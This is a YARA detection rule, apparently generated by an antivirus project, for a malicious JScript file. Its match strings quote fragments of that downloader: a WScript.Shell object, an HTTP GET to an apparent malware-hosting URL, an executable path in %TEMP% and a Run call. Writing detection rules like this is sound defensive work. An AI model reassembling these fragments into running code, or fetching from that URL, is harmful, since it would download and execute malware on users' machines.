rule sig_20160329_637076d7a64b352e011b7ac8f42b0fcb {
  meta:
    description = "datamaliciousorder - file 20160329_637076d7a64b352e011b7ac8f42b0fcb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bc9cf7f66a70ab466be948a6d146dcfbc4bae77c5d1c552834ec06d950d2ce9a"

  strings:
    $s1  = "function V() {return BB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"w1mlZDugnCOfkQ.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[C](V0() * 11); if (vT[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var BB = function r() {return WScript[p](\"WScript.Shell\");}(), s = 11;" fullword ascii
    $s4  = "vT[j](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s5  = "function i(Df, l){HN = HN * 1; return Df - l;};" fullword ascii
    $s6  = "function lm(){return \"\" + il;};" fullword ascii
    $s7  = "function KQ(K){BB[\"Run\"](K, HN, HN);};" fullword ascii
    $s8  = "function S() {return ((w == true) && (w == Zm)) ? 1 : HN;};" fullword ascii
    $s9  = "function v()" fullword ascii
    $s10 = " while (h){" fullword ascii
    $s11 = "function ey(P) {var J = (1, 2, 3, 4, 5, P); return J;};" fullword ascii
    $s12 = "function V0(){return 22;};" fullword ascii
    $s13 = "function r0(){return p;};" fullword ascii
    $s14 = "return i(a, Im);" fullword ascii
    $s15 = "var mJ = new this[\"Date\"]();" fullword ascii
    $s16 = "var w = false;" fullword ascii
    $s17 = "w = true; " fullword ascii
    $s18 = "Zm = true; " fullword ascii
    $s19 = "var Jp = false;" fullword ascii
    $s20 = "var Zm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}